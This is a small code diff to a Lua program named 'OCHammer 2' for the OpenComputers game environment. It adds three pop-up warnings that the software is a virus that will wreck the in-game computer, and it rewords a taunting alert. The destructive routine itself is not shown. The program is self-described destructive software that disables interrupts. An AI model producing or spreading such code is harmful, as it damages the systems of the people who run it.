@@ -19,6 +19,10 @@ local wait = event.sleep
 
 event.interruptingEnabled = false
 
+GUI.alert("This software (OCHammer 2) is considered a virus.\nIf you wish to continue, please press OK.\nOtherwise, please reboot the computer by\nusing the power button.")
+GUI.alert("Are you sure?\nIf yes, then please press OK.\nOtherwise, please reboot the computer by\nusing the power button.")
+GUI.alert("ARE YOU SURE? AFTER YOU CLICK OK, THERE IS NO GOING BACK.\nYOUR OPENCOMPUTER WILL BE WRECKED IF YOU CONTINUE")
+
 function FUN()
 
   local cdir = fs.path(system.getCurrentScript())
@@ -42,7 +46,7 @@ function FUN()
   -- update the file list
   
   
-  GUI.alert("fortnite is better than roblox stay mad")
+  GUI.alert("There's no going back now.")
 
   event.push("system","updateFileList")
 
